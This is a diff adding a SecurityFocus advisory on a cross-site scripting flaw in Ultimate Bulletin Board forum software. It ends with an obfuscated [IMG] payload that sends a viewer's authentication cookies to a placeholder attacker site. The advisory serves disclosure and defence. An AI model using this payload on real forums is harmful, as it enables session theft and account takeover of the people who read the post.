@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/3829/info
+
+UBB (Ultimate Bulletin Board) is commercial web forums/community software that is written in Perl. It runs on various Unix/Linux variants, as well as Microsoft Windows NT/2000.
+
+UBB is prone to cross-agent scripting attacks via the insertion of HTML tags into image links in messages. Due to insufficient input validation, it is possible to insert arbitrary script code in forum messages/replies. The malicious script code will be executed in the browser of the user viewing the message, in the context of the site running UBB.
+
+This makes it possible for a malicious user to post a message which is capable of stealing another legitimate user's cookie-based authentication credentials. 
+
+The following example will send cookie-based authentication credentials to the attacker's site:
+
+[IMG]javascr&#x69;pt:document.wr&#x69;te
+&#x28;'<img%20src=&#x68;tt&#x70;://attackersite/tools/cookie.plx?
+cookie='+escape&#x28;document.cook&#x69;e&#x29;+'>'&#x29;
+[/IMG] 
